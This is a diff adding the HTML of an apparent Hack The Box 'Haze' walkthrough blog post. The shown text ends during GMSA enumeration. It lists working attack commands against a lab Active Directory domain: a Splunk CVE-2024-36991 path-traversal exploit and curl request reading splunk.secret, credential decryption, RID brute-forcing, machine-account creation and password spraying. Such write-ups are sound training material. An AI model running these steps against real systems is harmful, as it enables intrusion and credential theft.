@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="HTB Haze - Complete Penetration Testing WalkthroughIntroductionWelcome to my comprehensive walkthrough of Haze, a Hard-difficulty Windows Active Directory machine from Hack The Box (HTB). This writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Haze">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/10/29/HTB-Haze/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="HTB Haze - Complete Penetration Testing WalkthroughIntroductionWelcome to my comprehensive walkthrough of Haze, a Hard-difficulty Windows Active Directory machine from Hack The Box (HTB). This writeup">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/port-8000.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/splunk-exploit.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/passwords-splunk.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/local-auth-user.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/splunk_pass.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/RID-Brute.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/add-machine.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/mark-adams.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/gmsa-dump.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/forcechange.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/access-backups.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Haze/apps.png">
+<meta property="article:published_time" content="2025-10-29T02:32:47.000Z">
+<meta property="article:modified_time" content="2025-10-29T02:34:03.904Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Hack The Box">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Haze/port-8000.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB-Haze</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/10/28/HTB-Cerberus/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/10/29/HTB-Haze/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&text=HTB-Haze"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&title=HTB-Haze"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&is_video=false&description=HTB-Haze"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB-Haze&body=Check out this article: https://panosoikogr.github.io/2025/10/29/HTB-Haze/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&title=HTB-Haze"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&title=HTB-Haze"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&title=HTB-Haze"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&title=HTB-Haze"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&name=HTB-Haze&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/10/29/HTB-Haze/&t=HTB-Haze"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Haze-Complete-Penetration-Testing-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">HTB Haze - Complete Penetration Testing Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.2.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Results"><span class="toc-number">1.2.1.</span> <span class="toc-text">Nmap Scan Results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.3.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Splunk-Web-Interface-Port-8000"><span class="toc-number">1.3.1.</span> <span class="toc-text">Splunk Web Interface (Port 8000)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-36991-Splunk-Path-Traversal"><span class="toc-number">1.3.2.</span> <span class="toc-text">CVE-2024-36991 - Splunk Path Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Decryption"><span class="toc-number">1.3.3.</span> <span class="toc-text">Credential Decryption</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration"><span class="toc-number">1.4.</span> <span class="toc-text">Active Directory Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-BloodHound-Collection"><span class="toc-number">1.4.1.</span> <span class="toc-text">Initial BloodHound Collection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adding-a-Machine-Account"><span class="toc-number">1.4.2.</span> <span class="toc-text">Adding a Machine Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Spraying"><span class="toc-number">1.4.3.</span> <span class="toc-text">Password Spraying</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Mark-Adams"><span class="toc-number">1.5.</span> <span class="toc-text">Privilege Escalation - Mark.Adams</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyzing-BloodHound-Data"><span class="toc-number">1.5.1.</span> <span class="toc-text">Analyzing BloodHound Data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GMSA-Investigation"><span class="toc-number">1.5.2.</span> <span class="toc-text">GMSA Investigation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Modifying-GMSA-Permissions"><span class="toc-number">1.5.3.</span> <span class="toc-text">Modifying GMSA Permissions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dumping-the-GMSA-Hash"><span class="toc-number">1.5.4.</span> <span class="toc-text">Dumping the GMSA Hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-Edward-Martin"><span class="toc-number">1.6.</span> <span class="toc-text">Lateral Movement - Edward.Martin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyzing-Haze-IT-Backup-Permissions"><span class="toc-number">1.6.1.</span> <span class="toc-text">Analyzing Haze-IT-Backup$ Permissions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-Group-Membership"><span class="toc-number">1.6.2.</span> <span class="toc-text">Abusing Group Membership</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shadow-Credentials-Attack"><span class="toc-number">1.6.3.</span> <span class="toc-text">Shadow Credentials Attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-Backup-Files"><span class="toc-number">1.6.4.</span> <span class="toc-text">Accessing Backup Files</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Splunk-Backup-Analysis"><span class="toc-number">1.7.</span> <span class="toc-text">Splunk Backup Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Extracting-Credentials"><span class="toc-number">1.7.1.</span> <span class="toc-text">Extracting Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-Administrator-Access"><span class="toc-number">1.8.</span> <span class="toc-text">Gaining Administrator Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Splunk-Admin-Access"><span class="toc-number">1.8.1.</span> <span class="toc-text">Splunk Admin Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-Malicious-Splunk-App"><span class="toc-number">1.8.2.</span> <span class="toc-text">Creating Malicious Splunk App</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-to-SYSTEM"><span class="toc-number">1.9.</span> <span class="toc-text">Privilege Escalation to SYSTEM</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SeImpersonatePrivilege-Abuse"><span class="toc-number">1.9.1.</span> <span class="toc-text">SeImpersonatePrivilege Abuse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">1.10.</span> <span class="toc-text">Conclusion</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HTB-Haze
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-29T02:32:47.000Z" class="dt-published" itemprop="datePublished">2025-10-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Hack-The-Box/" rel="tag">Hack The Box</a>, <a class="p-category" href="/tags/Windows/" rel="tag">Windows</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="HTB-Haze-Complete-Penetration-Testing-Walkthrough"><a href="#HTB-Haze-Complete-Penetration-Testing-Walkthrough" class="headerlink" title="HTB Haze - Complete Penetration Testing Walkthrough"></a>HTB Haze - Complete Penetration Testing Walkthrough</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Welcome to my comprehensive walkthrough of <strong>Haze</strong>, a Hard-difficulty Windows Active Directory machine from <strong>Hack The Box (HTB)</strong>. This writeup demonstrates a complete penetration testing methodology, from initial reconnaissance to full domain compromise.</p>
+<p>In this walkthrough, I’ll demonstrate exploitation of <strong>Splunk CVE-2024-36991</strong> (path traversal vulnerability), <strong>Active Directory enumeration techniques</strong>, <strong>GMSA (Group Managed Service Account) abuse</strong>, <strong>Shadow Credentials attacks</strong>, and <strong>privilege escalation via SeImpersonatePrivilege</strong>. This box showcases real-world Active Directory misconfigurations and provides excellent practice for OSCP&#x2F;OSEP certification preparation.</p>
+<p><strong>Tools Used:</strong></p>
+<ul>
+<li>Nmap - Network reconnaissance</li>
+<li>NetExec (formerly CrackMapExec) - SMB&#x2F;LDAP enumeration</li>
+<li>BloodHound - Active Directory graphing and attack path analysis</li>
+<li>BloodyAD - Active Directory exploitation framework</li>
+<li>Splunk Secrets - Splunk credential decryption</li>
+<li>Impacket Suite - Windows protocol exploitation</li>
+<li>GodPotato - Privilege escalation</li>
+</ul>
+<p><strong>Target Information:</strong></p>
+<ul>
+<li>Machine: Haze</li>
+<li>Difficulty: Hard</li>
+<li>OS: Windows Server with Active Directory</li>
+<li>Domain: haze.htb</li>
+<li>IP: 10.129.232.50</li>
+</ul>
+<p>Let’s dive into the complete exploitation chain!</p>
+<hr>
+<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><h3 id="Nmap-Scan-Results"><a href="#Nmap-Scan-Results" class="headerlink" title="Nmap Scan Results"></a>Nmap Scan Results</h3><p>Starting with a comprehensive port scan, we discover multiple services running on the target:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows </span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: haze.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.haze.htb</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows</span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd</span><br><span class="line">8000/tcp  open  http          syn-ack ttl 127 Splunkd httpd</span><br><span class="line">|_Requested resource was http://10.129.232.50:8000/en-US/account/login?return_to=%2Fen-US%2F</span><br><span class="line">|_http-server-header: Splunkd</span><br><span class="line">8088/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd</span><br><span class="line">8089/tcp  open  ssl/http      syn-ack ttl 127 Splunkd httpd</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">58106/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">58107/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">58120/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">58123/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">58134/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">58151/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+
+<p><strong>Key Findings:</strong></p>
+<ul>
+<li>Domain Controller: dc01.haze.htb</li>
+<li>Domain: haze.htb</li>
+<li>Splunk services running on ports 8000, 8088, 8089</li>
+<li>Standard Active Directory services present</li>
+</ul>
+<hr>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Splunk-Web-Interface-Port-8000"><a href="#Splunk-Web-Interface-Port-8000" class="headerlink" title="Splunk Web Interface (Port 8000)"></a>Splunk Web Interface (Port 8000)</h3><p>Navigating to port 8000 reveals a Splunk web interface:</p>
+<p><img src="/images/Haze/port-8000.png" alt="Splunk Login Interface"></p>
+<p>Further investigation of port 8089 reveals the Splunk version: <strong>9.2.1</strong></p>
+<p><img src="/images/Haze/splunk-exploit.png" alt="Splunk Version Information"></p>
+<h3 id="CVE-2024-36991-Splunk-Path-Traversal"><a href="#CVE-2024-36991-Splunk-Path-Traversal" class="headerlink" title="CVE-2024-36991 - Splunk Path Traversal"></a>CVE-2024-36991 - Splunk Path Traversal</h3><p>A quick search reveals that Splunk 9.2.1 is vulnerable to <strong>CVE-2024-36991</strong>, a path traversal vulnerability. I found a proof-of-concept exploit: <a target="_blank" rel="noopener" href="https://github.com/jaytiwari05/CVE-2024-36991">https://github.com/jaytiwari05/CVE-2024-36991</a></p>
+<p>Running the exploit reveals sensitive information:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -u 10.129.232.50:8000 -s 1</span><br></pre></td></tr></table></figure>
+
+<p><strong>Splunk Users and Password Hashes:</strong></p>
+<p><img src="/images/Haze/passwords-splunk.png" alt="Splunk User Credentials"></p>
+<p><strong>Local Authentication Configuration:</strong></p>
+<p><img src="/images/Haze/local-auth-user.png" alt="Local Authentication User"></p>
+<h3 id="Credential-Decryption"><a href="#Credential-Decryption" class="headerlink" title="Credential Decryption"></a>Credential Decryption</h3><p>The exploit also returns the Splunk secret key needed to decrypt stored credentials:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Running: curl -s &quot;http://10.129.232.50:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../C:../C:../C:../C:../C:../C:/Program%20Files/Splunk/etc/auth/splunk.secret&quot;</span><br><span class="line">NfKeJCdFGKUQUqyQmnX/WM9xMn5uVF32qyiofYPHkEOGcpMsEN.lRPooJnBdEL5Gh2wm12jKEytQoxsAYA5mReU9.h0SYEwpFMDyyAuTqhnba9P2Kul0dyBizLpq6Nq5qiCTBK3UM516vzArIkZvWQLk3Bqm1YylhEfdUvaw1ngVqR1oRtg54qf4jG0X16hNDhXokoyvgb44lWcH33FrMXxMvzFKd5W3TaAUisO6rnN0xqB7cHbofaA1YV9vgD</span><br></pre></td></tr></table></figure>
+
+<p>Using the <code>splunksecrets</code> Python tool to decrypt the password:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">splunksecrets splunk-decrypt -S secret_spunk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haze/splunk_pass.png" alt="Decrypted Splunk Password"></p>
+<p><strong>Recovered Credentials:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Paul.Taylor : Ld@p_Auth_Sp1unk@2k24</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Active-Directory-Enumeration"><a href="#Active-Directory-Enumeration" class="headerlink" title="Active Directory Enumeration"></a>Active Directory Enumeration</h2><h3 id="Initial-BloodHound-Collection"><a href="#Initial-BloodHound-Collection" class="headerlink" title="Initial BloodHound Collection"></a>Initial BloodHound Collection</h3><p>With valid credentials, let’s perform a BloodHound collection to map the Active Directory environment:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc01.haze.htb -u &#x27;Paul.Taylor&#x27; -p &#x27;Ld@p_Auth_Sp1unk@2k24&#x27; --bloodhound --dns-server 10.129.232.50 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure>
+
+<p>The initial BloodHound dump returns minimal information - only the user we compromised. This suggests limited permissions. Let’s try RID brute-forcing to discover additional domain objects:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb dc01.haze.htb -u &#x27;Paul.Taylor&#x27; -p &#x27;Ld@p_Auth_Sp1unk@2k24&#x27; --rid</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haze/RID-Brute.png" alt="RID Brute Force Results"></p>
+<p>This reveals more information about the domain structure. Additionally, Paul.Taylor has the <strong>MachineAccountQuota</strong> permission, allowing us to add computer accounts to the domain.</p>
+<h3 id="Adding-a-Machine-Account"><a href="#Adding-a-Machine-Account" class="headerlink" title="Adding a Machine Account"></a>Adding a Machine Account</h3><p>Let’s verify the MachineAccountQuota:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc01.haze.htb -u &#x27;Paul.Taylor&#x27; -p &#x27;Ld@p_Auth_Sp1unk@2k24&#x27; -M maq</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Haze/add-machine.png" alt="Machine Account Quota"></p>
+<p>Creating a new machine account for better enumeration:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyad -d &quot;haze.htb&quot; -u paul.taylor -p &#x27;Ld@p_Auth_Sp1unk@2k24&#x27; --host &quot;dc01.haze.htb&quot; add computer &#x27;hello&#x27; &#x27;Ld@p_Auth_Sp1unk@2k24&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Re-running BloodHound with the new machine account:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc01.haze.htb -u &#x27;hello$&#x27; -p &#x27;Ld@p_Auth_Sp1unk@2k24&#x27; --bloodhound --dns-server 10.129.232.50 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h3><p>After reviewing BloodHound data, Paul.Taylor doesn’t have any immediate attack paths. Let’s try password spraying with the discovered credential:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netexec smb dc01.haze.htb -u users -p &#x27;Ld@p_Auth_Sp1unk@2k24&#x27; --continue-on-success</span><br><span class="line">SMB         10.129.232.50   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 </span><br><span class="line">SMB         10.129.232.50   445    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24</span><br></pre></td></tr></table></figure>
+
+<p><strong>Excellent!</strong> Mark.Adams reuses the same password.</p>
+<hr>
+<h2 id="Privilege-Escalation-Mark-Adams"><a href="#Privilege-Escalation-Mark-Adams" class="headerlink" title="Privilege Escalation - Mark.Adams"></a>Privilege Escalation - Mark.Adams</h2><h3 id="Analyzing-BloodHound-Data"><a href="#Analyzing-BloodHound-Data" class="headerlink" title="Analyzing BloodHound Data"></a>Analyzing BloodHound Data</h3><p>Looking at Mark.Adams in BloodHound reveals an interesting attack path:</p>
+<p><img src="/images/Haze/mark-adams.png" alt="Mark Adams Privileges"></p>
+<p>Mark.Adams has <strong>write permissions</strong> over the <code>msDS-GroupMSAMembership</code> attribute of the <strong>Haze-IT-Backup$</strong> GMSA (Group Managed Service Account).</p>
+<h3 id="GMSA-Investigation"><a href="#GMSA-Investigation" class="headerlink" title="GMSA Investigation"></a>GMSA Investigation</h3><p>Attempting to directly retrieve the GMSA password fails:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap dc01.haze.htb -u mark.adams -p &#x27;Ld@p_Auth_Sp1unk@2k24&#x27; --gmsa</span><br></pre></td></tr></table></figure>
+
+<p>Let’s investigate the GMSA permissions using BloodyAD:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host dc.haze.htb -d haze.htb --dc-ip 10.129.232.50 -u mark.adams -p &#x27;Ld@p_Auth_Sp1unk@2k24&#x27; get object &#x27;HAZE-IT-BACKUP$&#x27; --resolve-sd --attr msDS-GroupMSAMembership</span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb</span><br><span class="line">msDS-GroupMSAMembership.Owner: BUILTIN_ADMINISTRATORS</span><br><span class="line">msDS-GroupMSAMembership.Control: DACL_PRESENT|SELF_RELATIVE</span><br><span class="line">msDS-GroupMSAMembership.ACL.Type: == ALLOWED ==</span><br><span class="line">msDS-GroupMSAMembership.ACL.Trustee: Domain Admins</span><br><span class="line">msDS-GroupMSAMembership.ACL.Right: GENERIC_ALL</span><br><span class="line">msDS-GroupMSAMembership.ACL.ObjectType: Self</span><br></pre></td></tr></table></figure>
+
+<p>Checking what Mark.Adams can write:</p>
